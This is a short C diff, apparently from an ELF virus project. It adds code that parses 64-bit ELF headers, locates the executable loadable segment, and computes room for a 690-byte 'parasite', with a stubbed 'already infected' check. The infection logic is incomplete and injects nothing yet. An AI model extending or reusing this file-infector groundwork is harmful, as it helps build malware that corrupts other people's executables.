@@ -208,12 +208,33 @@ int out_of_range(t_file *file, void * ptr)
 
 int do_the_job(t_file *file)
 {
-	if (file->size < sizeof(Elf64_Ehdr))
+	Elf64_Ehdr          *header;
+	Elf64_Phdr*             seg;
+	size_t      parasite_size = 690;
+	int i;
+	if (file->size < sizeof(Elf64_Ehdr) || ft_strncmp(file->data, ELFMAG,SELFMAG) || file->data[EI_CLASS] != ELFCLASS64)
 		return (1);
-	if (ft_strncmp(file->data, ELFMAG,SELFMAG))
-		return 1;
-	if (file->data[EI_CLASS] != ELFCLASS64)
-		return 1;
+
+	header = (Elf64_Ehdr *)file->data;
+	seg = (Elf64_Phdr*)(file->data + header->e_phoff);
+	for (i = header->e_phnum; i-- > 0; seg++)
+	{
+		if (seg->p_type == PT_LOAD)
+		{
+			if (seg->p_flags == (PF_R | PF_X))
+			{
+				unsigned int pt = (PAGE_SIZE - 4) - parasite_size; // remplacer le 4 par la size de la signature
+
+				//la c est le check de la signature
+				// p_hdr->p_offset + p_hdr->p_filesz + pt
+				if ("equal" && 0)
+				return 1;
+			}
+		}
+	}
+	//check if all ready infected
+
+
 	return 0;
 }
 
@@ -257,8 +278,6 @@ int open_directory(const char *path)
 		}
 	}
 	close(dd);
-
-	//printf("fin open_dir2\n");
 	return 0;
 }
 
